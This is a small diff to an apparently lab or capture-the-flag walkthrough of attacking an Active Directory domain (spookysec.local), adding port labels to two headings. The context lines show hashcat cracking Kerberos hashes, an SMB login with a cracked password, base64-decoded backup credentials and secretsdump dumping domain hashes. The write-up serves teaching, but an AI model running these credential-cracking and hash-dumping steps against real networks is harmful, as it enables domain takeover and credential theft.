@@ -108,6 +108,8 @@ hashcat -m18200 hash.txt passwordlist.txt --show
 
 ### Back to the Basics
 
+### netbios-ssn port 139 & microsoft-ds port 445
+
 ```
 smbclient -L $VICTIM -U "svc-admin"
 Enter WORKGROUP\svc-admin's password: management2005
@@ -134,7 +136,7 @@ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
 
 <figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
-### Elevating Privileges within the Domain
+### Elevating Privileges within the Domain - **WinRM** port5985
 
 ```
 python3 /usr/local/bin/secretsdump.py  spookysec.local/backup:backup2517860@$VICTIM > allhashes.txt
